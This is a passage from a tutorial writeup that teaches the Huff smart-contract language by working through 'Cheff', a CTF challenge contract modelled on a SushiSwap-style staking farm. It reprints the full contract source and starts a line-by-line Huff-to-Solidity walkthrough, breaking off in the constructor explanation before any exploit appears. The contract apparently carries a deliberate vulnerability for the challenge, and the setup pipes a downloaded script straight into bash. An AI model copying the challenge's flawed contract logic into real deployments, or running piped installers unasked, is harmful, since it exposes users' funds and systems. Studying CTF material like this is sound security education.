+++
title = "Learn Huff by solving a CTF challenge"
date = "2025-12-14"

[taxonomies]
tags=["web3", "huff", "evm"]

[extra]

+++

Huff is a low-level programming language for writing highly optimized EVM smart contracts. High-level languages like Solidity and Vyper prioritize developer experience through abstraction, improving readability and reducing implementation complexity. These abstractions impose an optimization ceiling that prevents developers from achieving maximum gas efficiency. Yul, an intermediate language usable as inline assembly in Solidity or as standalone code, offers better optimization than Solidity but still cannot match direct opcode-level control. The Aztec Protocol team created Huff to implement [Weierstrudel](https://github.com/aztecprotocol/weierstrudel/tree/master/huff_modules), an on-chain elliptic curve arithmetic library requiring gas optimization beyond what existing languages could provide. In fact, Huff is not a new programming language for EVM, it is just a set of tools created to help developers to write smart contracts with pure EVM opcodes.

This writeup covers solving `Cheff`, a CTF challenge from the StateMind Fellowship CTF. The solution demonstrates Huff programming concepts through identifying and exploiting a vulnerability in the contract. This writeup assumes familiarity with EVM blockchain fundamentals, including calldata handling, memory management, and storage layout. Readers unfamiliar with these EVM internals can reference the linked writeups below that cover these concepts through practical challenges. 

## Setup

Install the Huff compiler using [huffup](https://docs.huff.sh/get-started/installing/):

```bash
curl -L get.huff.sh | bash
huffup
```

Compile Huff contracts with the `huffc` command:

```bash
huffc contract.huff --bytecode
```

For detailed installation instructions, project structure, and advanced compilation options, refer to the [official Huff documentation](https://docs.huff.sh/). 

Foundry supports Huff contract development through the [huff-project-template](https://github.com/huff-language/huff-project-template). Standard Foundry commands like `forge build` and `forge install` work within this template. Foundry cannot compile Huff contracts by default. The [foundry-huff](https://github.com/huff-language/foundry-huff) library integrates `huffc` with Foundry's build system, requiring the Huff compiler to be installed. The template includes a SimpleStore example demonstrating the setup.

## Understanding Cheff.huff

The `Cheff.huff` contract below demonstrates key Huff concepts through line-by-line walkthrough. Each function includes side-by-side comparison with equivalent Solidity code to illustrate how Huff's low-level opcodes map to high-level constructs. 

{% note(clickable=true, hidden=true, header="Cheff.huff") %}
```huff
#include "../lib/huffmate/src/auth/Owned.huff"
#include "../lib/huffmate/src/utils/SafeTransferLib.huff"
#include "../lib/huffmate/src/math/SafeMath.huff"
#include "../lib/huffmate/src/auth/NonPayable.huff"
#include "../lib/huffmate/src/data-structures/Hashmap.huff"

#define function poolLength() view returns (uint256)
#define function add(uint256 allocPoint, address lpToken, bool withUpdate) nonpayable returns ()
#define function set(uint256 pid, uint256 allocPoint, bool withUpdate) nonpayable returns ()
#define function setMigrator(address migrator) nonpayable returns ()
#define function migrate(uint256 pid) nonpayable returns ()
#define function getMultiplier(uint256 from, uint256 to) view returns (uint256)
#define function pendingSushi(uint256 pid, address user) view returns (uint256)
#define function massUpdatePools() nonpayable returns ()
#define function updatePool(uint256 pid) nonpayable returns ()
#define function deposit(uint256 pid, uint256 amount) nonpayable returns ()
#define function withdraw(uint256 pid, uint256 amount) nonpayable returns ()
#define function emergencyWithdraw(uint256 pid) nonpayable returns ()
#define function dev(address devaddr) nonpayable returns ()
#define function sushi() view returns (address)
#define function devaddr() view returns (address)
#define function bonusEndBlock() view returns (uint256)
#define function sushiPerBlock() view returns (uint256)
#define function BONUS_MULTIPLIER() view returns (uint256)
#define function migrator() view returns (address)
#define function poolInfo(uint256 pid) view returns (address,uint256,uint256,uint256)
#define function userInfo(uint256 pid, address user) view returns (uint256,uint256)
#define function totalAllocPoint() view returns (uint256)
#define function startBlock() view returns (uint256)
#define function player() view returns (address)
#define function isSolved() view returns (bool)

#define event Deposit(address indexed user, uint256 indexed pid, uint256 amount)
#define event Withdraw(address indexed user, uint256 indexed pid, uint256 amount)
#define event EmergencyWithdraw(address indexed user, uint256 indexed pid, uint256 amount)

#define error Unauthorized()
#define error OutOfBounds()
#define error NoMigrator()
#define error CallFailed()
#define error ReturnDataSizeIsZero()
#define error BadMigrate()
#define error WithdrawNotGood()

#define constant BONUS_MULTIPLIER_CONSTANT = 0x0a
#define constant E = 0xe8d4a51000 

#define constant SUSHI_SLOT = FREE_STORAGE_POINTER()
#define constant DEVADDR_SLOT = FREE_STORAGE_POINTER()
#define constant BONUS_END_BLOCK_SLOT = FREE_STORAGE_POINTER()  
#define constant SUSHI_PER_BLOCK_SLOT = FREE_STORAGE_POINTER() 
#define constant MIGRATOR_SLOT = FREE_STORAGE_POINTER()
#define constant POOL_INFO_SLOT = FREE_STORAGE_POINTER()
#define constant USER_INFO_SLOT = FREE_STORAGE_POINTER()
#define constant TOTAL_ALLOC_POINT_SLOT = FREE_STORAGE_POINTER()
#define constant START_BLOCK_SLOT = FREE_STORAGE_POINTER()  
#define constant PLAYER_SLOT = FREE_STORAGE_POINTER()

#define macro CONSTRUCTOR() = {
    OWNED_CONSTRUCTOR()
    0xc0 0xe0 codesize sub
    0x00 codecopy
    0x00 mload
    [SUSHI_SLOT] sstore
    0x20 mload
    [DEVADDR_SLOT] sstore
    0x40 mload
    [SUSHI_PER_BLOCK_SLOT] sstore
    0x60 mload
    [START_BLOCK_SLOT] sstore
    0x80 mload
    [BONUS_END_BLOCK_SLOT] sstore
    0xa0 mload
    [PLAYER_SLOT] sstore
    0x68 dup1
    codesize sub
    dup1 swap2
    0x00 codecopy
    0x00 return
}

#define macro MAIN() = takes(0) returns(0) {
    NON_PAYABLE()
    0x00 calldataload 0xe0 shr
    dup1 __FUNC_SIG(poolLength)            eq pool_length_jump                  jumpi
    dup1 __FUNC_SIG(add)                   eq add_jump                          jumpi
    dup1 __FUNC_SIG(set)                   eq set_jump                          jumpi
    dup1 __FUNC_SIG(setMigrator)           eq set_migrator_jump                 jumpi
    dup1 __FUNC_SIG(migrate)               eq migrate_jump                      jumpi
    dup1 __FUNC_SIG(getMultiplier)         eq get_multiplier_jump               jumpi
    dup1 __FUNC_SIG(pendingSushi)          eq pending_sushi_jump                jumpi
    dup1 __FUNC_SIG(massUpdatePools)       eq mass_update_pools_jump            jumpi
    dup1 __FUNC_SIG(updatePool)            eq update_pool_jump                  jumpi
    dup1 __FUNC_SIG(deposit)               eq deposit_jump                      jumpi
    dup1 __FUNC_SIG(withdraw)              eq withdraw_jump                     jumpi
    dup1 __FUNC_SIG(emergencyWithdraw)     eq emergency_withdraw_jump           jumpi
    dup1 __FUNC_SIG(dev)                   eq dev_jump                          jumpi
    dup1 __FUNC_SIG(sushi)                 eq sushi_jump                        jumpi
    dup1 __FUNC_SIG(devaddr)               eq devaddr_jump                      jumpi
    dup1 __FUNC_SIG(bonusEndBlock)         eq bonus_end_block_jump              jumpi
    dup1 __FUNC_SIG(sushiPerBlock)         eq sushi_per_block_jump              jumpi
    dup1 __FUNC_SIG(BONUS_MULTIPLIER)      eq bonus_multiplier_jump             jumpi
    dup1 __FUNC_SIG(migrator)              eq migrator_jump                     jumpi
    dup1 __FUNC_SIG(poolInfo)              eq pool_info_jump                    jumpi
    dup1 __FUNC_SIG(userInfo)              eq user_info_jump                    jumpi
    dup1 __FUNC_SIG(totalAllocPoint)       eq total_alloc_point_jump            jumpi
    dup1 __FUNC_SIG(startBlock)            eq start_block_jump                  jumpi
    dup1 __FUNC_SIG(player)                eq player_jump                       jumpi
    dup1 __FUNC_SIG(isSolved)              eq is_solved_jump                    jumpi
    OWNED_MAIN()
    0x00 dup1 revert
    pool_length_jump:
        POOL_LENGTH()
    add_jump:
        ADD()
    set_jump:
        SET()
    set_migrator_jump:
        SET_MIGRATOR()
    migrate_jump:
        MIGRATE()
    get_multiplier_jump:
        GET_MULTIPLIER()
    pending_sushi_jump:
        PENDING_SUSHI()
    mass_update_pools_jump:
        MASS_UPDATE_POOLS()
    update_pool_jump:
        UPDATE_POOL()
    deposit_jump:
        DEPOSIT()
    withdraw_jump:
        WITHDRAW()
    emergency_withdraw_jump:
        EMERGENCY_WITHDRAW()
    dev_jump:
        DEV()
    sushi_jump:
        SUSHI()
    devaddr_jump:
        DEVADDR()
    bonus_end_block_jump:
        BONUS_END_BLOCK()
    sushi_per_block_jump:
        SUSHI_PER_BLOCK()
    bonus_multiplier_jump:
        BONUS_MULTIPLIER()
    migrator_jump:
        MIGRATOR()
    pool_info_jump:
        POOL_INFO()
    user_info_jump:
        USER_INFO()
    total_alloc_point_jump:
        TOTAL_ALLOC_POINT()
    start_block_jump:
        START_BLOCK()
    player_jump:
        PLAYER()
    is_solved_jump:
        IS_SOLVED()
}

#define macro IS_SOLVED() = takes(0) returns(0) {
    [SUSHI_SLOT] sload
    [PLAYER_SLOT] sload
    ERC20_BALANCE_OF(0x00)
    0xd3c21bcecceda1000000
    gt iszero
    0x40 mstore
    0x20 0x40 return
    
}

#define macro POOL_LENGTH() = takes(0) returns(0) {
    [POOL_INFO_SLOT] sload
    0x00 mstore
    0x20 0x00 return
}

#define macro ADD() = takes(0) returns(0) {
    ONLY_OWNER()
    0x04 calldataload
    0x24 calldataload
    0x44 calldataload
    iszero no_update_jump jumpi
        MASS_UPDATE_POOLS()
    no_update_jump:
    [START_BLOCK_SLOT] sload
    dup1 number
    gt iszero
    is_not_bigger_jump jumpi
        pop number
    is_not_bigger_jump:
    swap2 dup1
    [TOTAL_ALLOC_POINT_SLOT] sload
    SAFE_ADD()
    [TOTAL_ALLOC_POINT_SLOT] sstore
    swap1
    [POOL_INFO_SLOT] dup1 sload
    dup1 0x01 add
    dup3 sstore
    0x04 mul
    swap1 0x00 mstore
    0x20 0x00 sha3
    add
    swap1 dup2 sstore
    0x01 add
    swap1 dup2 sstore
    0x01 add sstore
    stop
}

#define macro SET() = takes(0) returns(0) {
    ONLY_OWNER()
    0x04 calldataload
    dup1 CHECK_PID()
    0x24 calldataload
    0x44 calldataload
    iszero
    no_update_jump jumpi
        MASS_UPDATE_POOLS()
    no_update_jump:
    swap1 GET_POOL_SLOT(0x00)
    0x01 add
    dup2 dup2 sload
    [TOTAL_ALLOC_POINT_SLOT] sload
    SAFE_SUB() SAFE_ADD()
    [TOTAL_ALLOC_POINT_SLOT] sstore sstore
    stop
}

#define macro SET_MIGRATOR() = takes(0) returns(0) {
    ONLY_OWNER()
    0x04 calldataload
    [MIGRATOR_SLOT] sstore
    stop
}

#define macro MIGRATE() = takes(0) returns(0) {
    [MIGRATOR_SLOT] sload dup1
    iszero iszero
    is_not_zero_jump jumpi
        __ERROR(NoMigrator) 0x00 mstore
        0x04 0x00 revert
    is_not_zero_jump: 
    0x04 calldataload
    dup1 CHECK_PID()
    GET_POOL_SLOT(0x00)
    dup1 sload                    
    dup1 address
    ERC20_BALANCE_OF(0x00)
    dup2 swap1 dup5
    SAFE_APPROVE(0x20)
    __RIGHTPAD(0xce5494bb) 0x20 mstore
    0x24 mstore
    swap1 0x20 0x24 0x20 0x00 0x20
    swap5 gas call
    call_success_jump jumpi
        __ERROR(CallFailed) <mem_ptr> mstore
        0x04 <mem_ptr> revert
    call_success_jump:                      
    returndatasize
    size_is_not_zero_jump jumpi
        __ERROR(ReturnDataSizeIsZero) <mem_ptr> mstore 
        0x04 <mem_ptr> revert
    size_is_not_zero_jump:
    0x20 mload
    address
    ERC20_BALANCE_OF(0x40)
    0x00 mload
    eq balances_equal_jump jumpi
        __ERROR(ReturnDataSizeIsZero) 0x00 mstore
        0x04 0x00 revert
    balances_equal_jump:
    0x20 mload
    swap1 sstore
    stop
}

#define macro GET_MULTIPLIER() = takes(0) returns(0) {
    0x04 calldataload
    0x24 calldataload
    INNER_GET_MULTIPLIER()
    0x00 mstore
    0x20 0x00 return
}

#define macro PENDING_SUSHI() = takes(0) returns(0) {
    0x04 calldataload
    dup1 CHECK_PID()
    GET_POOL_SLOT(0x00)
    dup1 0x03 add sload
    dup2 sload
    address
    ERC20_BALANCE_OF(0x00)
    dup3 0x02 add sload
    dup1 number gt
    dup3 iszero iszero
    and iszero
    condition_is_false_jump jumpi
        number
        INNER_GET_MULTIPLIER()
        [SUSHI_PER_BLOCK_SLOT] sload
        SAFE_MUL()
        dup4 0x01 add sload
        SAFE_MUL()
        [TOTAL_ALLOC_POINT_SLOT] sload
        swap1 SAFE_DIV()
        [E] SAFE_MUL() SAFE_DIV()
        SAFE_ADD()
        swap1 pop
        end_jump jump                                      
    condition_is_false_jump:
        pop pop
        swap1 pop
    end_jump:
    [E]
    0x24 calldataload
    0x04 calldataload
    [USER_INFO_SLOT]
    GET_SLOT_FROM_KEYS_2D(0x00)
    dup1 sload
    swap1 0x01 add sload
    swap3
    SAFE_MUL() SAFE_DIV() SAFE_SUB()
    0x00 mstore
    0x20 0x00 return
}

#define macro MASS_UPDATE_POOLS() = takes(0) returns(0) {
    [POOL_INFO_SLOT] sload
    dup1 iszero
    end_jump jumpi
    0x00
    start_jump jump
    continue_jump:
        eq end_jump jumpi
        start_jump:
        dup1
        INNER_UPDATE_POOL()
        0x01 add
        dup2 dup2
        continue_jump jump
    end_jump:
    stop
}

#define macro UPDATE_POOL() = takes(0) returns(0) {
    0x04 calldataload
    dup1 CHECK_PID()
    INNER_UPDATE_POOL()
    stop
}

#define macro DEPOSIT() = takes(0) returns(0) {
    0x24 calldataload  
    0x04 calldataload 
    dup1 CHECK_PID()  
    dup1 
    INNER_UPDATE_POOL() 
    dup1 
    GET_POOL_SLOT(0x00)  
    caller dup3 
    [USER_INFO_SLOT] 
    GET_SLOT_FROM_KEYS_2D(0x20) 
    dup1 sload 
    dup1 iszero 
    user_amount_zero_jump jumpi 
        dup1 [E] 
        dup5 0x03 add sload 
        dup5 0x01 add 
        sload 
        swap3 
        SAFE_MUL() 
        SAFE_DIV() 
        SAFE_SUB() 
        caller 
        SAFE_SUSHI_TRANSFER(0x00)  
    user_amount_zero_jump:   
    dup3 sload 
    dup6 address caller 
    SAFE_TRANSFER_FROM(0x00)
    dup1 dup6 SAFE_ADD()
    dup3 sstore
    [E] swap1
    dup4 0x03 add sload
    SAFE_MUL() SAFE_DIV()
    dup2 0x01 add sstore
    pop pop swap1
    0x00 mstore
    caller
    __EVENT_HASH(Deposit)
    0x20 0x00 log3
    stop
}

#define macro WITHDRAW() = takes(0) returns(0) {
    0x24 calldataload
    0x04 calldataload 
    dup1 CHECK_PID()
    caller dup2 [USER_INFO_SLOT]
    GET_SLOT_FROM_KEYS_2D(0x00)
    dup1 sload
    dup1 dup5 gt iszero
    continue_jump jumpi
        __ERROR(WithdrawNotGood) 0x00 mstore
        0x04 0x00 revert
    continue_jump:
    dup3
    INNER_UPDATE_POOL()
    dup3 GET_POOL_SLOT(0x00)
    dup2 dup4 0x01 add sload
    [E] dup4 0x03 add sload
    dup1 swap4
    SAFE_MUL() SAFE_DIV() SAFE_SUB()
    caller
    SAFE_SUSHI_TRANSFER(0x00)
    dup6 dup4 sub dup5 sstore
    [E] swap1 dup4
    SAFE_MUL() SAFE_DIV()
    dup4 0x01 add sstore
    sload dup5 caller
    SAFE_TRANSFER(0x00)
    swap3 0x00 mstore
    pop caller
    __EVENT_HASH(Withdraw)
    0x20 0x00 log3
    stop
}

#define macro EMERGENCY_WITHDRAW() = takes(0) returns(0) {
    0x04 calldataload  
    dup1 
    CHECK_PID() 
    caller dup2 [USER_INFO_SLOT] 
    GET_SLOT_FROM_KEYS_2D(0x00) 
    dup1 sload 
    dup2 0x01 add sload
    dup4 
    GET_POOL_SLOT(0x00) 
    sload  
    dup3 caller 
    SAFE_TRANSFER(0x00) 
    dup2 0x00 mstore 
    swap3 caller 
    __EVENT_HASH(EmergencyWithdraw) 
    0x20 0x00 log3 
    0x00 swap3 swap1 
    sstore 
    sstore 
    stop
}

#define macro DEV() = takes(0) returns(0) {
    [DEVADDR_SLOT] sload
    caller eq only_dev_jump jumpi
    __ERROR(Unauthorized) 0x00 mstore
    0x04 0x00 revert
    only_dev_jump:
    0x04 calldataload
    [DEVADDR_SLOT] sstore
    stop
}

#define macro SUSHI() = takes(0) returns(0) {
    [SUSHI_SLOT] sload
    0x00 mstore
    0x20 0x00 return
}

#define macro DEVADDR() = takes(0) returns(0) {
    [DEVADDR_SLOT] sload
    0x00 mstore
    0x20 0x00 return
}

#define macro BONUS_END_BLOCK() = takes(0) returns(0) {
    [BONUS_END_BLOCK_SLOT] sload
    0x00 mstore
    0x20 0x00 return
}

#define macro SUSHI_PER_BLOCK() = takes(0) returns(0) {
    [SUSHI_PER_BLOCK_SLOT] sload
    0x00 mstore
    0x20 0x00 return
}

#define macro BONUS_MULTIPLIER() = takes(0) returns(0) {
    [BONUS_MULTIPLIER_CONSTANT] 0x00 mstore
    0x20 0x00 return
}

#define macro MIGRATOR() = takes(0) returns(0) {
    [MIGRATOR_SLOT] sload
    0x00 mstore
    0x20 0x00 return
}

#define macro POOL_INFO() = takes(0) returns(0) {
    0x04 calldataload
    dup1 CHECK_PID()
    GET_POOL_SLOT(0x00)
    dup1 sload
    0x00 mstore
    dup1 0x01 add sload
    0x20 mstore
    dup1 0x02 add sload
    0x40 mstore
    dup1 0x03 add sload
    0x60 mstore
    0x80 0x00 return
}

#define macro USER_INFO() = takes(0) returns(0) {
    0x24 calldataload
    0x04 calldataload
    [USER_INFO_SLOT]
    GET_SLOT_FROM_KEYS_2D(0x00)
    dup1 sload
    0x00 mstore
    0x01 add sload
    0x20 mstore
    0x40 0x00 return
}

#define macro TOTAL_ALLOC_POINT() = takes(0) returns(0) {
    [TOTAL_ALLOC_POINT_SLOT] sload
    0x00 mstore
    0x20 0x00 return
}

#define macro START_BLOCK() = takes(0) returns(0) {
    [START_BLOCK_SLOT] sload
    0x00 mstore
    0x20 0x00 return
}

#define macro PLAYER() = takes(0) returns(0) {
    [PLAYER_SLOT] sload
    0x00 mstore
    0x20 0x00 return
}

#define macro ONLY_OWNER() = takes (0) returns (0) {
    [OWNER] sload
    caller eq ONLY_OWNER_continue jumpi
    __ERROR(Unauthorized) 0x00 mstore
    0x04 0x00 revert
    ONLY_OWNER_continue:
}

#define macro INNER_GET_MULTIPLIER() = takes(2) returns(1) { 
    [BONUS_END_BLOCK_SLOT] sload 
    dup1 dup3 gt 
    to_is_bigger_jump jumpi 
        pop 
        SAFE_SUB() 
        [BONUS_MULTIPLIER_CONSTANT] SAFE_MUL() 
        end_jump jump 
    to_is_bigger_jump: 
    dup1 dup4 lt 
    from_is_smaller_jump jumpi 
        pop 
        SAFE_SUB() 
        end_jump jump 
    from_is_smaller_jump: 
    swap2 dup3 
    SAFE_SUB() 
    [BONUS_MULTIPLIER_CONSTANT] SAFE_MUL() 
    swap2 swap1 
    SAFE_SUB() 
    SAFE_ADD() 
    end_jump: 
}

#define macro ERC20_BALANCE_OF(mem_ptr) = takes(2) returns(1) {
    __RIGHTPAD(0x70a08231) <mem_ptr> mstore 
    <mem_ptr> 0x04 add mstore 
    <mem_ptr> 0x24 <mem_ptr> 0x20 
    swap4 gas staticcall  
    call_success_jump jumpi
        __ERROR(CallFailed) <mem_ptr> mstore
        0x04 <mem_ptr> revert
    call_success_jump:                      
    returndatasize
    size_is_not_zero_jump jumpi
        __ERROR(ReturnDataSizeIsZero) <mem_ptr> mstore
        0x04 <mem_ptr> revert
    size_is_not_zero_jump:
    <mem_ptr> mload
}

#define macro SUSHI_MINT(mem_ptr) = takes(3) returns(0) {
    __RIGHTPAD(0x40c10f19) <mem_ptr> mstore 
    <mem_ptr> 0x04 add mstore
    <mem_ptr> 0x24 add mstore
    <mem_ptr> 0x44 <mem_ptr> 0x00 0x00 
    swap5 gas call 
    call_success_jump jumpi
        __ERROR(CallFailed) <mem_ptr> mstore
        0x04 <mem_ptr> revert
    call_success_jump:
}

#define macro INNER_UPDATE_POOL() = takes(1) returns(0) { 
    GET_POOL_SLOT(0x00) 
    dup1 0x02 add sload
    dup1 number gt 
    block_number_bigger_jump jumpi 
        pop pop 
        end_jump jump 
    block_number_bigger_jump: 
    swap1 dup1 sload 
    address 
    ERC20_BALANCE_OF(0x00) 
    dup1 
    lp_supply_not_zero_jump jumpi 
        pop 0x02 add 
        number swap1 
        sstore 
        pop 
        end_jump jump 
    lp_supply_not_zero_jump: 
    swap2 number 
    INNER_GET_MULTIPLIER() 
    [SUSHI_PER_BLOCK_SLOT] sload 
    SAFE_MUL() 
    dup2 0x01 add sload 
    SAFE_MUL() 
    [TOTAL_ALLOC_POINT_SLOT] sload swap1 
    SAFE_DIV() 
    [SUSHI_SLOT] sload dup1 
    0x0a dup4 
    SAFE_DIV() 
    [DEVADDR_SLOT] sload 
    SUSHI_MINT(0x00) 
    dup2 address 
    SUSHI_MINT(0x00) 
    swap1 swap2 swap1 
    [E] 
    SAFE_MUL()  
    SAFE_DIV() 
    dup2 0x03 add sload 
    SAFE_ADD() 
    dup2 0x03 add 
    sstore  
    number  
    swap1 0x02 add sstore 
    end_jump: 
}

#define macro CHECK_PID() = takes(1) returns(0) {
    [POOL_INFO_SLOT] sload
    gt
    is_not_out_of_bounds_jump jumpi
        __ERROR(OutOfBounds) 0x00 mstore
        0x04 0x00 revert
    is_not_out_of_bounds_jump:
}

#define macro GET_POOL_SLOT(mem_ptr) = takes(1) returns(1) {
    [POOL_INFO_SLOT]
    <mem_ptr> mstore
    0x04 mul
    0x20 <mem_ptr> sha3
    add
}

#define macro SAFE_SUSHI_TRANSFER(mem_ptr) = takes(2) returns(0) {
    [SUSHI_SLOT] sload dup1 address
    ERC20_BALANCE_OF(<mem_ptr>)
    dup1 dup5 gt
    amount_bigger_jump jumpi
        pop swap2 swap1
        SUSHI_TRANSFER(<mem_ptr>)
        end_jump jump
    amount_bigger_jump:
        swap1 swap2
        SUSHI_TRANSFER(<mem_ptr>)
        pop
    end_jump:
}

#define macro SUSHI_TRANSFER(mem_ptr) = takes(3) returns(0) {
    __RIGHTPAD(0xa9059cbb) <mem_ptr> mstore
    <mem_ptr> 0x04 add mstore
    <mem_ptr> 0x24 add mstore
    <mem_ptr> 0x44 <mem_ptr> 
    0x00 0x00 swap5 gas call
    call_success_jump jumpi
        __ERROR(CallFailed) <mem_ptr> mstore
        0x04 <mem_ptr> revert
    call_success_jump:
}
```
{%end%}

### Include Directives

Huff uses `#include` directives to import external libraries, functioning like Solidity's `import` statements. The contract imports several libraries from [huffmate](https://github.com/huff-language/huffmate/tree/main), the Huff equivalent of OpenZeppelin's Solidity libraries. 

{% note(clickable=true, hidden=true, header="Huff Code : include derectives") %}
```huff
#include "../lib/huffmate/src/auth/Owned.huff"
#include "../lib/huffmate/src/utils/SafeTransferLib.huff"
#include "../lib/huffmate/src/math/SafeMath.huff"
#include "../lib/huffmate/src/auth/NonPayable.huff"
#include "../lib/huffmate/src/data-structures/Hashmap.huff"
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent : import") %}
```solidity
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";
```
{%end%}

### Interface Definitions

Huff uses `#define` directives to declare functions, events, errors, and constants. Function and event definitions enable the compiler to generate the contract ABI and provide the `__FUNC_SIG` and `__EVENT_HASH` builtins for generating selectors at compile time. Error definitions declare custom revert reasons, and constants define compile-time values.

{% note(clickable=true, hidden=true, header="Huff Code : ABI Interface") %}
```huff
#define function poolLength() view returns (uint256)
#define function add(uint256 allocPoint, address lpToken, bool withUpdate) nonpayable returns ()
#define function set(uint256 pid, uint256 allocPoint, bool withUpdate) nonpayable returns ()
#define function setMigrator(address migrator) nonpayable returns ()
#define function migrate(uint256 pid) nonpayable returns ()
#define function getMultiplier(uint256 from, uint256 to) view returns (uint256)
#define function pendingSushi(uint256 pid, address user) view returns (uint256)
#define function massUpdatePools() nonpayable returns ()
#define function updatePool(uint256 pid) nonpayable returns ()
#define function deposit(uint256 pid, uint256 amount) nonpayable returns ()
#define function withdraw(uint256 pid, uint256 amount) nonpayable returns ()
#define function emergencyWithdraw(uint256 pid) nonpayable returns ()
#define function dev(address devaddr) nonpayable returns ()
#define function sushi() view returns (address)
#define function devaddr() view returns (address)
#define function bonusEndBlock() view returns (uint256)
#define function sushiPerBlock() view returns (uint256)
#define function BONUS_MULTIPLIER() view returns (uint256)
#define function migrator() view returns (address)
#define function poolInfo(uint256 pid) view returns (address,uint256,uint256,uint256)
#define function userInfo(uint256 pid, address user) view returns (uint256,uint256)
#define function totalAllocPoint() view returns (uint256)
#define function startBlock() view returns (uint256)
#define function player() view returns (address)
#define function isSolved() view returns (bool)

#define event Deposit(address indexed user, uint256 indexed pid, uint256 amount)
#define event Withdraw(address indexed user, uint256 indexed pid, uint256 amount)
#define event EmergencyWithdraw(address indexed user, uint256 indexed pid, uint256 amount)

#define error Unauthorized()
#define error OutOfBounds()
#define error NoMigrator()
#define error CallFailed()
#define error ReturnDataSizeIsZero()
#define error BadMigrate()
#define error WithdrawNotGood()

#define constant BONUS_MULTIPLIER_CONSTANT = 0x0a
#define constant E = 0xe8d4a51000
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent : ABI Interface") %}
```solidity
interface ICheff {
    function poolLength() external view returns (uint256);
    function add(uint256 allocPoint, address lpToken, bool withUpdate) external;
    function set(uint256 pid, uint256 allocPoint, bool withUpdate) external;
    function setMigrator(address migrator) external;
    function migrate(uint256 pid) external;
    function getMultiplier(uint256 from, uint256 to) external view returns (uint256);
    function pendingSushi(uint256 pid, address user) external view returns (uint256);
    function massUpdatePools() external;
    function updatePool(uint256 pid) external;
    function deposit(uint256 pid, uint256 amount) external;
    function withdraw(uint256 pid, uint256 amount) external;
    function emergencyWithdraw(uint256 pid) external;
    function dev(address devaddr) external;
    function sushi() external view returns (address);
    function devaddr() external view returns (address);
    function bonusEndBlock() external view returns (uint256);
    function sushiPerBlock() external view returns (uint256);
    function BONUS_MULTIPLIER() external view returns (uint256);
    function migrator() external view returns (address);
    function poolInfo(uint256 pid) external view returns (address,uint256,uint256,uint256);
    function userInfo(uint256 pid, address user) external view returns (uint256,uint256);
    function totalAllocPoint() external view returns (uint256);
    function startBlock() external view returns (uint256);
    function player() external view returns (address);
    function isSolved() external view returns (bool);

    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);
    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);
    event EmergencyWithdraw(address indexed user, uint256 indexed pid, uint256 amount);

    error Unauthorized();
    error OutOfBounds();
    error NoMigrator();
    error CallFailed();
    error ReturnDataSizeIsZero();
    error BadMigrate();
    error WithdrawNotGood();
}

contract Cheff {
    uint256 constant BONUS_MULTIPLIER_CONSTANT = 0x0a;
    uint256 constant E = 0xe8d4a51000;
}
```
{%end%}

### Storage Slot Definitions

Huff uses `FREE_STORAGE_POINTER()` to automatically assign sequential storage slots without manual tracking. Each invocation returns the next available unused storage slot, preventing storage collisions. These constants define where contract state variables are stored in persistent storage.

{% note(clickable=true, hidden=true, header="Huff Code : FREE_STORAGE_POINTER()") %}
```huff
#define constant SUSHI_SLOT = FREE_STORAGE_POINTER()
#define constant DEVADDR_SLOT = FREE_STORAGE_POINTER()
#define constant BONUS_END_BLOCK_SLOT = FREE_STORAGE_POINTER()
#define constant SUSHI_PER_BLOCK_SLOT = FREE_STORAGE_POINTER()
#define constant MIGRATOR_SLOT = FREE_STORAGE_POINTER()
#define constant POOL_INFO_SLOT = FREE_STORAGE_POINTER()
#define constant USER_INFO_SLOT = FREE_STORAGE_POINTER()
#define constant TOTAL_ALLOC_POINT_SLOT = FREE_STORAGE_POINTER()
#define constant START_BLOCK_SLOT = FREE_STORAGE_POINTER()
#define constant PLAYER_SLOT = FREE_STORAGE_POINTER()
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent : Storage slots") %}
```solidity
contract Cheff {
    address public sushi;              // SUSHI_SLOT = slot 0
    address public devaddr;            // DEVADDR_SLOT = slot 1
    uint256 public bonusEndBlock;      // BONUS_END_BLOCK_SLOT = slot 2
    uint256 public sushiPerBlock;      // SUSHI_PER_BLOCK_SLOT = slot 3
    address public migrator;           // MIGRATOR_SLOT = slot 4
    uint256 public poolInfoLength;     // POOL_INFO_SLOT = slot 5 (array length)
    mapping(uint256 => mapping(address => UserInfo)) public userInfo;  // USER_INFO_SLOT = slot 6
    uint256 public totalAllocPoint;    // TOTAL_ALLOC_POINT_SLOT = slot 7
    uint256 public startBlock;         // START_BLOCK_SLOT = slot 8
    address public player;             // PLAYER_SLOT = slot 9
}
```
{%end%}

### Constructor Macro

Macros in Huff organize reusable bytecode blocks that are inlined at the point of invocation during compilation. The `CONSTRUCTOR` macro executes once during contract deployment to initialize storage state. Unlike Solidity's implicit constructor, Huff requires explicit handling of constructor arguments and runtime bytecode deployment.

The constructor copies constructor arguments from the deployment bytecode to memory, then stores each argument in its designated storage slot. The final instructions copy the runtime bytecode (the actual contract code) and return it to complete deployment. This introduces several fundamental opcodes: `codesize` pushes the size of deployed bytecode to the stack; `codecopy` copies code from a source offset to memory destination with parameters (destOffset, offset, size); `mload` loads 32 bytes from memory at a specified offset; `sstore` stores a value to a storage slot taking (slot, value) parameters; `sub` subtracts the top two stack values; `dup1` duplicates the top stack item; `swap2` swaps the top stack item with the third item; and `return` halts execution returning data from memory with (offset, size) parameters.

Huff syntax introduces several important concepts: macros are defined using `#define macro NAME() = { ... }` to create reusable bytecode blocks; macro invocation like `OWNED_CONSTRUCTOR()` inlines another macro's code directly at that location during compilation; bracket notation `[CONSTANT_NAME]` pushes constant values onto the stack; literal hexadecimal values like `0xc0` and `0x00` are pushed directly to the stack; and single-line comments use `//` syntax similar to other programming languages.

{% note(clickable=true, hidden=true, header="Huff Code : CONSTRUCTOR()") %}
```huff
#define macro CONSTRUCTOR() = {
    OWNED_CONSTRUCTOR()              // Initialize ownership (sets owner)
    0xc0 0xe0 codesize sub           // Calculate constructor args location: codesize - 0xe0 = args start
    0x00 codecopy                    // Copy 0xc0 bytes of constructor args to memory[0x00]
    0x00 mload                       // Load first arg (sushi address) from memory[0x00]
    [SUSHI_SLOT] sstore              // Store to SUSHI_SLOT
    0x20 mload                       // Load second arg from memory[0x20]
